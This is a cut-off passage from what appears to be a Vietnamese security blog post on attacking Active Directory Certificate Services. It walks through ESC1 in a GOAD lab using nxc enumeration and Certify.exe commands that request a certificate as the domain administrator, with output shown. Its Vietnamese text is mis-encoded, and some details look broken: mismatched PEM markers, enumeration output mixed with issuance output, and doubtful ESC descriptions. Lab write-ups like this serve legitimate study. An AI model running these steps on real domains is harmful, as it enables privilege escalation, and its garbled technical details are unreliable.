<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="apple-touch-icon" sizes="57x57" href="../../../favicon/apple-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="60x60" href="../../../favicon/apple-icon-60x60.png">
    <link rel="apple-touch-icon" sizes="72x72" href="../../../favicon/apple-icon-72x72.png">
    <link rel="apple-touch-icon" sizes="76x76" href="../../../favicon/apple-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="114x114" href="../../../favicon/apple-icon-114x114.png">
    <link rel="apple-touch-icon" sizes="120x120" href="../../../favicon/apple-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="144x144" href="../../../favicon/apple-icon-144x144.png">
    <link rel="apple-touch-icon" sizes="152x152" href="../../../favicon/apple-icon-152x152.png">
    <link rel="apple-touch-icon" sizes="180x180" href="../../../favicon/apple-icon-180x180.png">
    <link rel="icon" type="image/png" sizes="192x192" href="../../../favicon/android-icon-192x192.png">
    <link rel="icon" type="image/png" sizes="32x32" href="../../../favicon/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="96x96" href="../../../favicon/favicon-96x96.png">
    <link rel="icon" type="image/png" sizes="16x16" href="../../../favicon/favicon-16x16.png">
    <link rel="manifest" href="../../../favicon/manifest.json">
    <meta name="msapplication-TileColor" content="#ffffff">
    <meta name="msapplication-TileImage" content="../../../favicon/ms-icon-144x144.png">
    <meta name="theme-color" content="#ffffff">
    <title>Breaking Active Directory Certificate Services - Security Blog</title>
    <meta name="description" content="Kh√°m ph√° chuy√™n s√¢u c√°c l·ªó h·ªïng b·∫£o m·∫≠t trong ADCS v√† c√°c k·ªπ thu·∫≠t khai th√°c ti√™n ti·∫øn.">
    <meta name="date" content="2025-06-12">
    <meta name="author" content="UZIII2208">
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
    <link href="../../../css/styles.css" rel="stylesheet">
</head>
<body class="min-h-screen">
    <!-- Navigation -->
    <nav class="fixed top-0 w-full bg-gray-900 shadow-lg z-50">
        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
            <div class="flex items-center justify-between h-16">
                <div class="flex items-center">
                    <a href="/" class="text-green-400 hover:text-green-500 font-bold text-xl">UZIII2208</a>
                </div>
                <!-- Desktop Menu -->
                <div class="hidden md:block">
                    <div class="ml-10 flex items-baseline space-x-4">
                        <a href="/" class="nav-link px-3 py-2">Home</a>
                        <a href="/pages/about.html" class="nav-link px-3 py-2">About</a>
                        <a href="/pages/blogs.html" class="nav-link px-3 py-2">Blogs</a>
                        <a href="/pages/hackthebox.html" class="nav-link px-3 py-2">HackTheBox</a>
                        <a href="/pages/tryhackme.html" class="nav-link px-3 py-2">TryHackMe</a>
                        <a href="/pages/contact.html" class="nav-link px-3 py-2">Contact</a>
                        <a href="/pages/complaints.html" class="nav-link px-3 py-2">Complaints</a>
                        <div class="flex items-center space-x-4">
                            <button onclick="toggleSearch()" class="theme-toggle search-button">
                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
                                </svg>
                            </button>
                            <button id="theme-toggle" onclick="toggleTheme()" class="theme-toggle">
                                <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                                    <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z"></path>
                                </svg>
                            </button>
                            <button onclick="showVisitCount()" class="theme-toggle" id="visit-counter" title="Show Visit Count">
                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
                                </svg>
                            </button>
                        </div>
                    </div>
                </div>
                <!-- Mobile menu button -->
                <div class="md:hidden">
                    <button onclick="toggleMobileMenu()" class="text-gray-300 hover:text-white">
                        <svg class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16" />
                        </svg>
                    </button>
                </div>
            </div>
        </div>
        <!-- Mobile Menu -->
        <div id="mobile-menu" class="hidden md:hidden fixed inset-0 z-50">
            <!-- Backdrop with blur effect -->
            <div class="absolute inset-0 bg-black bg-opacity-50 backdrop-blur-sm" onclick="toggleMobileMenu()"></div>
            <!-- Menu Content -->
            <div class="relative h-full flex items-center justify-center" onclick="event.stopPropagation()">
                <div class="bg-gray-900 rounded-lg shadow-xl p-6 m-4 max-w-sm w-full transform transition-all relative">
                    <!-- Exit button -->
                    <button onclick="toggleMobileMenu()" class="absolute top-2 right-2 text-gray-400 hover:text-white p-2 hover:bg-gray-800 rounded-lg transition-all duration-300">
                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                        </svg>
                    </button>
                    <div class="space-y-4 mt-6">
                        <a href="/" class="nav-link block px-4 py-2 text-lg text-center rounded-lg hover:bg-gray-800">Home</a>
                        <a href="/pages/about.html" class="nav-link block px-4 py-2 text-lg text-center rounded-lg hover:bg-gray-800">About</a>
                        <a href="/pages/blogs.html" class="nav-link block px-4 py-2 text-lg text-center rounded-lg hover:bg-gray-800">Blogs</a>
                        <a href="/pages/hackthebox.html" class="nav-link block px-4 py-2 text-lg text-center rounded-lg hover:bg-gray-800">HackTheBox</a>
                        <a href="/pages/tryhackme.html" class="nav-link block px-4 py-2 text-lg text-center rounded-lg hover:bg-gray-800">TryHackMe</a>
                        <a href="/pages/contact.html" class="nav-link block px-4 py-2 text-lg text-center rounded-lg hover:bg-gray-800">Contact</a>
                        <a href="/pages/complaints.html" class="nav-link block px-4 py-2 text-lg text-center rounded-lg hover:bg-gray-800">Complaints</a>
                        <div class="flex items-center flex-col space-y-4 mt-6">
                            <!-- Mobile Search Container -->
                            <div id="mobile-search-container" class="search-container hidden fixed inset-0 z-50">
                                <!-- Backdrop with blur effect -->
                                <div class="absolute inset-0 bg-black bg-opacity-50 backdrop-blur-sm" onclick="toggleMobileSearch()"></div>
                                <!-- Search Content -->
                                <div class="relative h-full flex items-center justify-center" onclick="event.stopPropagation()">
                                    <div class="bg-gray-900 rounded-lg shadow-xl p-6 m-4 max-w-2xl w-full transform transition-all">
                                        <div class="relative">
                                            <input type="text" id="mobile-search-input" class="search-input w-full rounded-lg bg-gray-800 border-2 border-green-400 text-gray-100 pr-10" placeholder="Search posts..." oninput="performSearch(event)" autofocus>
                                            <button onclick="toggleMobileSearch()" class="absolute right-2 top-2 text-gray-400 hover:text-white">
                                                <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                                                </svg>
                                            </button>
                                        </div>
                                        <div id="mobile-search-results" class="search-results hidden mt-4 max-h-96 overflow-y-auto"></div>
                                    </div>
                                </div>
                            </div>
                            <div class="flex space-x-4">
                                <button onclick="toggleMobileSearch()" class="theme-toggle search-button p-2 hover:bg-gray-800 rounded-lg">
                                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path>
                                    </svg>
                                </button>
                                <button onclick="toggleTheme()" class="theme-toggle p-2 hover:bg-gray-800 rounded-lg">
                                    <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                                        <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z"></path>
                                    </svg>
                                </button>
                                <button onclick="showVisitCount()" class="theme-toggle p-2 hover:bg-gray-800 rounded-lg" title="Show Visit Count">
                                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z"/>
                                    </svg>
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </nav>

    <!-- Search Overlay -->
    <div id="search-overlay" class="search-overlay fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm hidden z-50">
        <div class="absolute inset-0" onclick="closeSearch()"></div>
        <div class="relative min-h-screen flex items-center justify-center">
            <div class="bg-gray-900 rounded-lg shadow-xl p-6 m-4 max-w-2xl w-full transform transition-all">
                <div class="flex justify-between items-center mb-4">
                    <h3 class="text-xl font-semibold text-green-400">Search Posts</h3>
                    <button onclick="closeSearch()" class="text-gray-400 hover:text-white p-2 hover:bg-gray-800 rounded-lg transition-all duration-300">
                        <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                        </svg>
                    </button>
                </div>
                <div class="search-container w-full">
                    <input type="text" id="search-input" class="search-input w-full bg-gray-800 text-white rounded-lg px-4 py-2 focus:outline-none focus:ring-2 focus:ring-green-400" placeholder="Search posts..." oninput="performSearch(event)">
                    <div id="search-results" class="search-results mt-4 max-h-96 overflow-y-auto"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Main Content -->
    <main class="pt-20 container mx-auto px-4 sm:px-6 lg:px-8">
        <article class="max-w-4xl mx-auto py-16 fade-in">
            <header class="mb-12">
                <img src="../breaking-active-directory-certificate-services-adcs/adcs_security.png" 
                     alt="ADCS Security Banner" 
                     class="rounded-lg shadow-lg mb-6">
                <h1 class="text-4xl md:text-6xl text-green-400 font-bold mb-4">Breaking Active Directory Certificate Services</h1>
                <div class="flex items-center space-x-4 text-gray-400">
                    <time datetime="2025-06-12">Jun 12, 2025</time>
                    <span>‚Ä¢</span>
                    <span>Security Blog</span>
                </div>
            </header>

            <!-- Security Advisory -->
            <div class="bg-red-900/30 border border-red-500 p-6 rounded-lg mb-8">
                <h2 class="text-red-400 text-xl font-semibold mb-4">‚ö†Ô∏è Security Advisory</h2>
                <p>B√†i vi·∫øt n√†y th·∫£o lu·∫≠n v·ªÅ c√°c attack vectors v√† techniques c√≥ th·ªÉ b·ªã l·ª£i d·ª•ng cho m·ª•c ƒë√≠ch malicious. Content ƒë∆∞·ª£c cung c·∫•p ch·ªâ nh·∫±m m·ª•c ƒë√≠ch research v√† educational.</p>
            </div>

            <div class="prose prose-lg prose-invert max-w-none space-y-12">
                <!-- Introduction -->
                <section class="mb-12">
                    <h2 class="text-2xl text-green-400 font-bold mb-6">Introduction</h2>
                    <div class="bg-gray-800 p-6 rounded-lg space-y-4">
                        <p>Active Directory Certificate Services (ADCS) - m·ªôt service ƒë∆∞·ª£c design ƒë·ªÉ manage digital certificates nh∆∞ng l·∫°i tr·ªü th√†nh m·ªôt trong nh·ªØng attack vector m·∫°nh m·∫Ω nh·∫•t trong m√¥i tr∆∞·ªùng Windows hi·ªán ƒë·∫°i.</p>
                        
                        <p>Issue ch√≠nh n·∫±m ·ªü ch·ªó - ph·∫ßn l·ªõn c√°c t·ªï ch·ª©c deploy ADCS v·ªõi dangerous default configurations, v√† nhi·ªÅu admins kh√¥ng th·ª±c s·ª± hi·ªÉu v·ªÅ security implications c·ªßa certificate templates. ƒêi·ªÅu n√†y t·∫°o ra m·ªôt goldmine cho attackers trong vi·ªác t√¨m ki·∫øm privilege escalation v√† persistence methods kh√≥ c√≥ th·ªÉ detect.</p>

                        <div class="bg-gray-900/50 p-4 rounded-lg mt-4">
                            <h3 class="text-xl text-green-400 font-semibold mb-3">Lab Environment</h3>
                            <p>T·∫•t c·∫£ examples trong article n√†y ƒë∆∞·ª£c demo tr√™n 
                                <a href="https://github.com/Orange-Cyberdefense/GOAD" class="text-green-400 hover:text-green-300">GOAD (Game of Active Directory)</a>
                                lab environment. Domains ƒë∆∞·ª£c s·ª≠ d·ª•ng bao g·ªìm:
                            </p>
                            <ul class="list-disc list-inside mt-2 space-y-1">
                                <li><code>essos.local</code></li>
                                <li><code>sevenkingdoms.local</code></li>
                                <li><code>north.sevenkingdoms.local</code></li>
                            </ul>
                        </div>
                    </div>
                </section>

                <!-- ESC Vulnerabilities Overview -->
                <section class="mb-12">
                    <h2 class="text-2xl text-green-400 font-bold mb-6">Overview: ESC Vulnerabilities</h2>
                    <div class="bg-gray-800 p-6 rounded-lg space-y-6">
                        <p>D∆∞·ªõi ƒë√¢y l√† overview c·ªßa 16 ESC (Enterprise Security Configuration) vulnerabilities ƒë√£ ƒë∆∞·ª£c discover trong ADCS:</p>                        <div class="grid md:grid-cols-2 gap-6">
                            <!-- Template Misconfigurations -->
                            <div class="bg-gray-900/50 p-4 rounded-lg">
                                <h3 class="text-lg text-green-400 font-semibold mb-3">Template Misconfigurations</h3>
                                <ul class="list-disc list-inside space-y-2">
                                    <li><strong>ESC1: Misconfigured Certificate Templates</strong><br>
                                        <span class="text-sm text-gray-400">Allows specifying arbitrary Subject Alternative Names</span></li>
                                    <li><strong>ESC2: Misconfigured Certificate Templates with Any Purpose EKU</strong><br>
                                        <span class="text-sm text-gray-400">Template allows unrestricted certificate usage</span></li>
                                    <li><strong>ESC3: Enrollment Agent Template Abuse</strong><br>
                                        <span class="text-sm text-gray-400">Allows requesting certificates on behalf of others</span></li>
                                    <li><strong>ESC4: Access Control Template Vulnerabilities</strong><br>
                                        <span class="text-sm text-gray-400">Weak template permissions enable modification</span></li>
                                </ul>
                            </div>

                            <!-- Access Control Issues -->
                            <div class="bg-gray-900/50 p-4 rounded-lg">
                                <h3 class="text-lg text-green-400 font-semibold mb-3">Access Control Vulnerabilities</h3>
                                <ul class="list-disc list-inside space-y-2">
                                    <li><strong>ESC5: Domain Escalation via Certificate Authority ACL</strong><br>
                                        <span class="text-sm text-gray-400">Vulnerable CA permissions configuration</span></li>
                                    <li><strong>ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 Abuse</strong><br>
                                        <span class="text-sm text-gray-400">CA allows SAN modification in requests</span></li>
                                    <li><strong>ESC7: Vulnerable Certificate Authority SID</strong><br>
                                        <span class="text-sm text-gray-400">CA SID vulnerability enables escalation</span></li>
                                    <li><strong>ESC8: NTLM Relay to HTTP/DCOM Endpoints</strong><br>
                                        <span class="text-sm text-gray-400">Certificate enrollment via NTLM relay</span></li>
                                </ul>
                            </div>

                            <!-- Configuration Issues -->
                            <div class="bg-gray-900/50 p-4 rounded-lg">
                                <h3 class="text-lg text-green-400 font-semibold mb-3">Configuration Weaknesses</h3>
                                <ul class="list-disc list-inside space-y-2">
                                    <li><strong>ESC9: No Security Extension Certificate Templates</strong><br>
                                        <span class="text-sm text-gray-400">Certificates persist through password changes</span></li>
                                    <li><strong>ESC10: Certificate Template Weak Mappings</strong><br>
                                        <span class="text-sm text-gray-400">Insecure certificate-to-account mapping</span></li>
                                    <li><strong>ESC11: ICERTREQUEST Unencrypted Communications</strong><br>
                                        <span class="text-sm text-gray-400">Exploitable certificate request interface</span></li>
                                    <li><strong>ESC12: CA Server Configuration Vulnerabilities</strong><br>
                                        <span class="text-sm text-gray-400">Direct CA server compromise vectors</span></li>
                                </ul>
                            </div>

                            <!-- Advanced Attacks -->
                            <div class="bg-gray-900/50 p-4 rounded-lg">
                                <h3 class="text-lg text-green-400 font-semibold mb-3">Advanced Attack Vectors</h3>
                                <ul class="list-disc list-inside space-y-2">
                                    <li><strong>ESC13: Certificate Issuance Policy Vulnerabilities</strong><br>
                                        <span class="text-sm text-gray-400">Policy bypass enables privileged certs</span></li>
                                    <li><strong>ESC14: Legacy Certificate Template Vulnerabilities</strong><br>
                                        <span class="text-sm text-gray-400">Version 1 template security issues</span></li>
                                    <li><strong>ESC15: Enrollment Agent Restrictions Bypass</strong><br>
                                        <span class="text-sm text-gray-400">Circumventing agent limitations</span></li>
                                    <li><strong>ESC16: ADCS Relay Attack via Web Enrollment</strong><br>
                                        <span class="text-sm text-gray-400">NTLM relay to certificate web enrollment</span></li>
                                </ul>
                            </div>
                        </div>

                        <div class="bg-yellow-900/30 border border-yellow-500 p-4 rounded-lg mt-6">
                            <h4 class="text-yellow-400 font-semibold mb-2">üí° Pro Tip</h4>
                            <p>M·ªói ESC vulnerability c√≥ th·ªÉ ƒë∆∞·ª£c chain v·ªõi nhau ƒë·ªÉ t·∫°o ra complex attack paths. Vi·ªác understand t·ª´ng vulnerability ri√™ng l·∫ª s·∫Ω gi√∫p b·∫°n craft ƒë∆∞·ª£c advanced attack chains ph√π h·ª£p v·ªõi target environment.</p>
                        </div>
                    </div>
                </section>

                <!-- ADCS Fundamentals -->
                <section class="mb-12">
                    <h2 class="text-2xl text-green-400 font-bold mb-6">Ki·∫øn Th·ª©c C∆° B·∫£n v·ªÅ ADCS</h2>
                    <div class="bg-gray-800 p-6 rounded-lg space-y-6">
                        <p>Tr∆∞·ªõc khi b·∫Øt ƒë·∫ßu t·∫•n c√¥ng, h√£y hi·ªÉu ƒëi·ªÅu g√¨ l√†m cho ADCS kh√°c bi·ªát so v·ªõi c√°c d·ªãch v·ª• Windows kh√°c. ADCS tri·ªÉn khai m·ªôt H·∫° t·∫ßng Kh√≥a C√¥ng khai (PKI) th∆∞·ªùng theo h·ªá th·ªëng ph√¢n c·∫•p sau:</p>

                        <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code>Root CA (Offline)
    ‚îî‚îÄ‚îÄ Subordinate CA (Online)
        ‚îî‚îÄ‚îÄ Certificate Templates
            ‚îî‚îÄ‚îÄ Issued Certificates</code>
                        </pre>

                        <div class="bg-gray-900/50 p-4 rounded-lg">
                            <h3 class="text-xl text-green-400 font-semibold mb-3">C√°c Th√†nh Ph·∫ßn Ch√≠nh</h3>
                            <ul class="list-disc list-inside space-y-2">
                                <li><strong>Certificate Authority (CA)</strong>: Ph√°t h√†nh v√† qu·∫£n l√Ω ch·ª©ng ch·ªâ</li>
                                <li><strong>M·∫´u Ch·ª©ng Ch·ªâ</strong>: X√°c ƒë·ªãnh lo·∫°i ch·ª©ng ch·ªâ n√†o c√≥ th·ªÉ ƒë∆∞·ª£c y√™u c·∫ßu v√† b·ªüi ai</li>
                                <li><strong>Kho Ch·ª©ng Ch·ªâ</strong>: N∆°i l∆∞u tr·ªØ ch·ª©ng ch·ªâ tr√™n m√°y t√≠nh</li>
                                <li><strong>T·ª± ƒë·ªông ƒêƒÉng k√Ω</strong>: ƒêƒÉng k√Ω ch·ª©ng ch·ªâ t·ª± ƒë·ªông cho c√°c ƒë·ªëi t∆∞·ª£ng trong domain</li>
                            </ul>
                        </div>

                        <div class="space-y-4">
                            <p>H√£y xem ƒëi·ªÅu n√†y ho·∫°t ƒë·ªông nh∆∞ th·∫ø n√†o trong m√¥i tr∆∞·ªùng GOAD c·ªßa ch√∫ng ta:</p>

                            <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code># Discover ADCS servers in the environment
nxc ldap 192.168.56.10-23 -u '' -p '' -M adcs

SMB         192.168.56.12   445    MEEREEN          [*] Windows 10.0 Build 17763 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:False)
LDAPS       192.168.56.12   636    MEEREEN          [+] essos.local\guest: 
ADCS        192.168.56.12   -      MEEREEN          Found PKI Enrollment Server: meereen.essos.local
ADCS        192.168.56.12   -      MEEREEN          Found CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local

SMB         192.168.56.23   445    BRAAVOS          [*] Windows 10.0 Build 17763 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:False)
LDAPS       192.168.56.23   636    BRAAVOS          [+] essos.local\guest: 
ADCS        192.168.56.23   -      BRAAVOS          Found PKI Enrollment Server: braavos.essos.local
ADCS        192.168.56.23   -      BRAAVOS          Found CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local
</code>
                            </pre>

                            <div class="bg-yellow-900/30 border border-yellow-500 p-4 rounded-lg">
                                <h4 class="text-yellow-400 font-semibold mb-2">‚ö†Ô∏è L∆∞u √Ω Quan Tr·ªçng</h4>
                                <p>ƒê·ªÉ ƒë·∫£m b·∫£o ƒë·ªô ch√≠nh x√°c v√† tr√°nh c√°c v·∫•n ƒë·ªÅ kh√¥ng kh·ªõp ch·ª©ng ch·ªâ, lu√¥n cung c·∫•p tham s·ªë <code>/sid</code> - ƒë√≥ l√† SID c·ªßa ng∆∞·ªùi d√πng m·ª•c ti√™u.</p>
                            </div>
                        </div>
                    </div>
                </section>

                <!-- Certificate Template Basics -->
                <section class="mb-12">
                    <h2 class="text-2xl text-green-400 font-bold mb-6">Ki·∫øn Th·ª©c C∆° B·∫£n v·ªÅ M·∫´u Ch·ª©ng Ch·ªâ</h2>
                    <div class="bg-gray-800 p-6 rounded-lg space-y-6">
                        <p>C√°c m·∫´u ch·ª©ng ch·ªâ l√† c·ªët l√µi c·ªßa c√°c cu·ªôc t·∫•n c√¥ng ADCS. Ch√∫ng x√°c ƒë·ªãnh:</p>
                        
                        <ul class="list-disc list-inside space-y-2 ml-4">
                            <li>Ai c√≥ th·ªÉ y√™u c·∫ßu ch·ª©ng ch·ªâ (quy·ªÅn ƒëƒÉng k√Ω)</li>
                            <li>Ch·ª©ng ch·ªâ c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng cho m·ª•c ƒë√≠ch g√¨ (M·ª•c ƒë√≠ch Kh√≥a M·ªü r·ªông)</li>
                            <li>Li·ªáu t√™n ch·ªß th·ªÉ c√≥ th·ªÉ ƒë∆∞·ª£c ch·ªâ ƒë·ªãnh b·ªüi ng∆∞·ªùi y√™u c·∫ßu hay kh√¥ng</li>
                            <li>C√°c y√™u c·∫ßu x√°c th·ª±c cho vi·ªác ƒëƒÉng k√Ω</li>
                        </ul>

                        <p>
                            ƒêi·ªÅu l√†m cho c√°c m·∫´u n√†y tr·ªü n√™n nguy hi·ªÉm l√† - ch√∫ng th∆∞·ªùng cho ph√©p quy·ªÅn truy c·∫≠p nhi·ªÅu h∆°n m·ª©c m√† c√°c qu·∫£n tr·ªã vi√™n nh·∫≠n ra. H√£y xem ch√∫ng ta t√¨m th·∫•y g√¨ trong GOAD, v√† li·ªát k√™ c√°c m·∫´u ch·ª©ng ch·ªâ v·ªõi l·ªánh <code>Certify.exe find /vulnerable</code>
                            . L·ªánh n√†y cho ch√∫ng ta th·∫•y m·ªôt s·ªë m·∫´u ch·ª©ng ch·ªâ d·ªÖ b·ªã t·ªïn th∆∞∆°ng trong m√¥i tr∆∞·ªùng GOAD. B√¢y gi·ªù h√£y ƒëi s√¢u v√†o vi·ªác khai th√°c ch√∫ng.
                        </p>
                    </div>
                </section>

                <!-- ESC1: Misconfigured Certificate Templates -->
                <section class="mb-12">
                    <h2 class="text-2xl text-green-400 font-bold mb-6">ESC1: Khai Th√°c M·∫´u Ch·ª©ng Ch·ªâ C·∫•u H√¨nh Sai</h2>
                    
                    <div class="bg-gray-800 p-6 rounded-lg space-y-6">
                        <div class="space-y-4">
                            <p>ESC1 l√† cu·ªôc t·∫•n c√¥ng ADCS ƒë∆°n gi·∫£n nh·∫•t, v√† th√†nh th·∫≠t m√† n√≥i, ƒë√≥ l√† cu·ªôc t·∫•n c√¥ng y√™u th√≠ch c·ªßa t√¥i v√¨ n√≥ r·∫•t ƒë√°ng tin c·∫≠y. N√≥ khai th√°c c√°c m·∫´u ch·ª©ng ch·ªâ cho ph√©p k·∫ª t·∫•n c√¥ng ch·ªâ ƒë·ªãnh c√°c T√™n Thay Th·∫ø Ch·ªß ƒê√≠ch (SAN) t√πy √Ω.</p>

                            <div class="bg-gray-900/50 p-4 rounded-lg">
                                <h3 class="text-xl text-green-400 font-semibold mb-4">Chi Ti·∫øt K·ªπ Thu·∫≠t</h3>
                                <p class="mb-4">Vulnerability x·∫£y ra khi m·ªôt m·∫´u ch·ª©ng ch·ªâ c√≥:</p>
                                
                                <ol class="list-decimal list-inside space-y-2 ml-4">
                                    <li>Flag <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> ƒë∆∞·ª£c b·∫≠t</li>
                                    <li><code>Client Authentication</code> ho·∫∑c <code>Any Purpose</code> EKU</li>
                                    <li>Quy·ªÅn ƒëƒÉng k√Ω cho <code>Domain Users</code></li>
                                    <li>Kh√¥ng y√™u c·∫ßu ph√™ duy·ªát c·ªßa qu·∫£n l√Ω</li>
                                </ol>
                            </div>

                            <div class="bg-gray-900/50 p-4 rounded-lg mt-6">
                                <h3 class="text-xl text-green-400 font-semibold mb-4">Quy Tr√¨nh Khai Th√°c</h3>
                                <p class="mb-4">ƒê·∫ßu ti√™n, h√£y li·ªát k√™ c√°c m·∫´u d·ªÖ b·ªã t·ªïn th∆∞∆°ng trong lab GOAD c·ªßa ch√∫ng ta:</p>
                                
                                <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code>Certify.exe find /vulnerable /enabled /enrolleeSuppliesSubject

[*] Action: Find certificate templates
[*] Using current user's unrolled group SID list for cross-references
[*] Current user context       : ESSOS\missandei
[*] Using the search base 'CN=Configuration,DC=essos,DC=local'


[!] Vulnerable Certificates Templates :

    CA Name                       : braavos.essos.local\ESSOS-CA
    Template Name                 : ESC1
    Schema Version                : 2
    Validity Period               : 1 year
    Renewal Period                : 6 weeks
    msPKI-Certificate-Name-Flag   : ENROLLEE_SUPPLIES_SUBJECT (0x1)
    mspki-enrollment-flag         : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required: 0
    pkiextendedkeyusage           : Client Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : ESSOS\Domain Users                    Access: Allow
        Enrollment Rights           : ESSOS\Domain Computers                Access: Allow
      Object Control Permissions  : ESSOS\missandei                      Access: Allow

[*] CA Response             : The certificate has been issued.

  KeyType                  : rc4_hmac
  Base64(key)              : F5/CqQX4m7A8VwM5cT6pQg==

  Note: KeyType may show AES256 on fully-patched DCs (ADV240011)
  If KeyType shows AES256, ensure you use a 256-bit compatible CSP (e.g., Microsoft Software Key Storage Provider)</code></pre>

                                <div class="mt-4">
                                    <p class="mb-2">Ho√†n h·∫£o! ƒê·∫ßu ra n√†y x√°c nh·∫≠n:</p>
                                    <ul class="list-disc list-inside ml-4 space-y-2">
                                        <li><code>ESSOS\Domain Users</code> c√≥ quy·ªÅn ƒëƒÉng k√Ω tr√™n m·∫´u "ESC1"</li>
                                        <li>M·∫´u cho ph√©p ng∆∞·ªùi ƒëƒÉng k√Ω cung c·∫•p ch·ªß th·ªÉ</li>
                                        <li><em>L∆∞u √Ω: <code>missandei</code> c≈©ng c√≥ quy·ªÅn ki·ªÉm so√°t ƒë·ªëi t∆∞·ª£ng</em></li>
                                    </ul>
                                </div>
                            </div>

                            <div class="bg-yellow-900/30 border border-yellow-500 p-4 rounded-lg">
                                <h4 class="text-yellow-400 font-semibold mb-2">‚ö†Ô∏è L∆∞u √Ω Quan Tr·ªçng</h4>
                                <p>ƒê·ªÉ ƒë·∫£m b·∫£o ƒë·ªô ch√≠nh x√°c v√† tr√°nh c√°c v·∫•n ƒë·ªÅ kh√¥ng kh·ªõp ch·ª©ng ch·ªâ, lu√¥n cung c·∫•p tham s·ªë <code>/sid</code> - ƒë√≥ l√† SID c·ªßa ng∆∞·ªùi d√πng m·ª•c ti√™u.</p>
                            </div>

                            <div class="space-y-4">
                                <h4 class="text-lg text-green-400 font-semibold">B∆∞·ªõc 1: Y√™u c·∫ßu ch·ª©ng ch·ªâ v·ªõi quy·ªÅn admin</h4>
                                <pre class="bg-gray-900 text-gray-400 p-4 rounded-lg overflow-x-auto"><code>Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC1 /altname:essos\administrator /sid:S-1-5-21-1394808576-3393508183-1134699666-500

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\missandei
[*] No subject name specified, using current context as subject.

[*] Template                : ESC1
[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local
[*] AltName                 : essos\administrator

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA

[*] CA Response             : The certificate has been issued.
[*] Request ID              : 7

[*] cert.pem                :
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2hT8F6PSyEzGCq5VJXpF8rTQoYmZ9BNQ3T4Uy8F0aGF9ZLQW
...certificate data...
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
</code></pre>
                            </div>

                            <div class="space-y-4">
                                <h4 class="text-lg text-green-400 font-semibold">B∆∞·ªõc 2: Chuy·ªÉn ƒë·ªïi sang ƒë·ªãnh d·∫°ng PFX</h4>
                                <p>C√≥ hai ph∆∞∆°ng ph√°p:</p>

                                <div class="bg-gray-900/50 p-4 rounded-lg space-y-4">
